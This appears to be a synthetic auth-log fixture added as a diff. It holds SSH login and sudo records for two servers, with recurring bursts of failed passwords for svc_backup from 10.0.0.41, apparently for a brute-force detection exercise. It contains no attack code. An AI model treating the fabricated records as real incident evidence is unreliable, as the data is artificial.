+Sep 21 14:12:25 webserver01 sshd[1865]: Accepted password for deploy from 192.168.1.22 port 52042 ssh2
+Sep 21 14:19:25 webserver01 sshd[6079]: Accepted password for deploy from 192.168.1.10 port 44648 ssh2
+Sep 21 14:20:00 dbserver01 sshd[4066]: Failed password for svc_backup from 10.0.0.41 port 59215 ssh2
+Sep 21 14:20:04 dbserver01 sshd[5698]: Failed password for svc_backup from 10.0.0.41 port 48247 ssh2
+Sep 21 14:20:08 dbserver01 sshd[4940]: Failed password for svc_backup from 10.0.0.41 port 44869 ssh2
+Sep 21 14:20:12 dbserver01 sshd[5792]: Failed password for svc_backup from 10.0.0.41 port 48447 ssh2
+Sep 21 14:20:16 dbserver01 sshd[2475]: Failed password for svc_backup from 10.0.0.41 port 47065 ssh2
+Sep 21 14:20:20 dbserver01 sshd[9728]: Failed password for svc_backup from 10.0.0.41 port 59444 ssh2
+Sep 21 14:23:25 webserver01 sshd[6476]: Accepted password for jsmith from 10.0.0.17 port 46057 ssh2
+Sep 21 14:23:55 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 14:30:25 webserver01 sshd[9613]: Accepted password for alice from 10.0.0.5 port 47604 ssh2
+Sep 21 14:39:25 webserver01 sshd[6842]: Accepted password for deploy from 192.168.1.22 port 47528 ssh2
+Sep 21 14:44:25 webserver01 sshd[7637]: Accepted password for bob from 10.0.0.5 port 55741 ssh2
+Sep 21 14:46:25 webserver01 sshd[3813]: Accepted password for jsmith from 10.0.0.5 port 40835 ssh2
+Sep 21 14:49:25 webserver01 sshd[9324]: Accepted password for jsmith from 192.168.1.10 port 42973 ssh2
+Sep 21 14:49:55 webserver01 sudo:  jsmith : TTY=pts/0 ; PWD=/home/jsmith ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 14:58:25 webserver01 sshd[4488]: Accepted password for bob from 10.0.0.5 port 47619 ssh2
+Sep 21 14:58:55 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 15:05:25 webserver01 sshd[2904]: Accepted password for bob from 10.0.0.17 port 50944 ssh2
+Sep 21 15:08:25 webserver01 sshd[5507]: Accepted password for jsmith from 10.0.0.17 port 54960 ssh2
+Sep 21 15:10:00 dbserver01 sshd[6027]: Failed password for svc_backup from 10.0.0.41 port 42582 ssh2
+Sep 21 15:10:04 dbserver01 sshd[4186]: Failed password for svc_backup from 10.0.0.41 port 41693 ssh2
+Sep 21 15:10:08 dbserver01 sshd[2750]: Failed password for svc_backup from 10.0.0.41 port 54274 ssh2
+Sep 21 15:10:12 dbserver01 sshd[1686]: Failed password for svc_backup from 10.0.0.41 port 52920 ssh2
+Sep 21 15:10:16 dbserver01 sshd[7382]: Failed password for svc_backup from 10.0.0.41 port 56800 ssh2
+Sep 21 15:10:20 dbserver01 sshd[8470]: Failed password for svc_backup from 10.0.0.41 port 44315 ssh2
+Sep 21 15:12:00 webserver01 sshd[8459]: Failed password for alice from 192.168.1.10 port 46828 ssh2
+Sep 21 15:12:03 webserver01 sshd[8194]: Failed password for alice from 192.168.1.10 port 43405 ssh2
+Sep 21 15:12:06 webserver01 sshd[7573]: Failed password for alice from 192.168.1.10 port 56724 ssh2
+Sep 21 15:12:09 webserver01 sshd[3864]: Failed password for alice from 192.168.1.10 port 50828 ssh2
+Sep 21 15:15:25 webserver01 sshd[5935]: Accepted password for jsmith from 192.168.1.22 port 55520 ssh2
+Sep 21 15:17:25 webserver01 sshd[6664]: Accepted password for deploy from 10.0.0.5 port 52536 ssh2
+Sep 21 15:20:25 webserver01 sshd[9347]: Failed password for deploy from 10.0.0.5 port 51226 ssh2
+Sep 21 15:20:40 webserver01 sshd[4648]: Accepted password for deploy from 10.0.0.5 port 41571 ssh2
+Sep 21 15:23:40 webserver01 sshd[8800]: Accepted password for alice from 192.168.1.10 port 46951 ssh2
+Sep 21 15:31:40 webserver01 sshd[9986]: Accepted password for deploy from 10.0.0.5 port 49356 ssh2
+Sep 21 15:32:10 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 15:40:40 webserver01 sshd[6810]: Failed password for bob from 192.168.1.10 port 43188 ssh2
+Sep 21 15:40:50 webserver01 sshd[5435]: Accepted password for bob from 192.168.1.10 port 59169 ssh2
+Sep 21 15:46:50 webserver01 sshd[1212]: Accepted password for deploy from 192.168.1.22 port 48567 ssh2
+Sep 21 15:47:20 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 15:54:50 webserver01 sshd[9179]: Accepted password for jsmith from 192.168.1.10 port 42824 ssh2
+Sep 21 16:00:00 dbserver01 sshd[3940]: Failed password for svc_backup from 10.0.0.41 port 41114 ssh2
+Sep 21 16:00:04 dbserver01 sshd[4878]: Failed password for svc_backup from 10.0.0.41 port 41439 ssh2
+Sep 21 16:00:08 dbserver01 sshd[3608]: Failed password for svc_backup from 10.0.0.41 port 51525 ssh2
+Sep 21 16:00:12 dbserver01 sshd[1453]: Failed password for svc_backup from 10.0.0.41 port 47040 ssh2
+Sep 21 16:00:16 dbserver01 sshd[5775]: Failed password for svc_backup from 10.0.0.41 port 54702 ssh2
+Sep 21 16:00:20 dbserver01 sshd[9936]: Failed password for svc_backup from 10.0.0.41 port 44317 ssh2
+Sep 21 16:01:50 webserver01 sshd[4223]: Accepted password for deploy from 10.0.0.5 port 50531 ssh2
+Sep 21 16:02:20 webserver01 sudo:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 16:05:50 webserver01 sshd[2585]: Accepted password for bob from 10.0.0.5 port 57465 ssh2
+Sep 21 16:08:50 webserver01 sshd[4209]: Accepted password for bob from 192.168.1.22 port 41155 ssh2
+Sep 21 16:09:20 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 16:13:50 webserver01 sshd[4664]: Accepted password for deploy from 192.168.1.10 port 47265 ssh2
+Sep 21 16:20:50 webserver01 sshd[6314]: Accepted password for jsmith from 192.168.1.22 port 55594 ssh2
+Sep 21 16:22:50 webserver01 sshd[1418]: Accepted password for alice from 10.0.0.17 port 42694 ssh2
+Sep 21 16:25:50 webserver01 sshd[8470]: Accepted password for jsmith from 192.168.1.22 port 58291 ssh2
+Sep 21 16:31:50 webserver01 sshd[4820]: Accepted password for alice from 192.168.1.10 port 50323 ssh2
+Sep 21 16:33:50 webserver01 sshd[2367]: Accepted password for deploy from 192.168.1.22 port 48197 ssh2
+Sep 21 16:39:50 webserver01 sshd[6867]: Accepted password for bob from 10.0.0.17 port 56241 ssh2
+Sep 21 16:40:20 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 16:42:50 webserver01 sshd[1603]: Failed password for bob from 192.168.1.22 port 52316 ssh2
+Sep 21 16:43:01 webserver01 sshd[5283]: Accepted password for bob from 192.168.1.22 port 45341 ssh2
+Sep 21 16:47:01 webserver01 sshd[9820]: Accepted password for bob from 10.0.0.5 port 46938 ssh2
+Sep 21 16:47:31 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 16:50:00 dbserver01 sshd[9590]: Failed password for svc_backup from 10.0.0.41 port 57215 ssh2
+Sep 21 16:50:04 dbserver01 sshd[7737]: Failed password for svc_backup from 10.0.0.41 port 45244 ssh2
+Sep 21 16:50:08 dbserver01 sshd[6387]: Failed password for svc_backup from 10.0.0.41 port 48744 ssh2
+Sep 21 16:50:12 dbserver01 sshd[8810]: Failed password for svc_backup from 10.0.0.41 port 43599 ssh2
+Sep 21 16:50:16 dbserver01 sshd[8715]: Failed password for svc_backup from 10.0.0.41 port 46035 ssh2
+Sep 21 16:50:20 dbserver01 sshd[3916]: Failed password for svc_backup from 10.0.0.41 port 56535 ssh2
+Sep 21 16:53:01 webserver01 sshd[1474]: Accepted password for jsmith from 10.0.0.17 port 55484 ssh2
+Sep 21 17:01:01 webserver01 sshd[5715]: Accepted password for deploy from 10.0.0.5 port 48463 ssh2
+Sep 21 17:04:01 webserver01 sshd[1654]: Accepted password for jsmith from 10.0.0.17 port 49017 ssh2
+Sep 21 17:09:01 webserver01 sshd[2907]: Accepted password for bob from 192.168.1.22 port 41175 ssh2
+Sep 21 17:09:31 webserver01 sudo:  bob : TTY=pts/0 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Sep 21 17:15:01 webserver01 sshd[8256]: Accepted password for jsmith from 10.0.0.5 port 46605 ssh2
+Sep 21 17:24:01 webserver01 sshd[8118]: Accepted password for bob from 192.168.1.10 port 43313 ssh2
+Sep 21 17:32:01 webserver01 sshd[1969]: Accepted password for alice from 10.0.0.5 port 53889 ssh2
+Sep 21 17:34:01 webserver01 sshd[9479]: Accepted password for deploy from 192.168.1.22 port 50577 ssh2
+Sep 21 17:40:00 dbserver01 sshd[3327]: Failed password for svc_backup from 10.0.0.41 port 57391 ssh2
+Sep 21 17:40:01 webserver01 sshd[9397]: Accepted password for jsmith from 192.168.1.22 port 45775 ssh2
+Sep 21 17:40:04 dbserver01 sshd[6677]: Failed password for svc_backup from 10.0.0.41 port 59088 ssh2
+Sep 21 17:40:08 dbserver01 sshd[6907]: Failed password for svc_backup from 10.0.0.41 port 50514 ssh2
+Sep 21 17:40:12 dbserver01 sshd[5505]: Failed password for svc_backup from 10.0.0.41 port 40718 ssh2
+Sep 21 17:40:16 dbserver01 sshd[5951]: Failed password for svc_backup from 10.0.0.41 port 42076 ssh2
+Sep 21 17:40:20 dbserver01 sshd[2434]: Failed password for svc_backup from 10.0.0.41 port 53592 ssh2
+Sep 21 17:44:01 webserver01 sshd[2213]: Accepted password for jsmith from 10.0.0.17 port 41141 ssh2
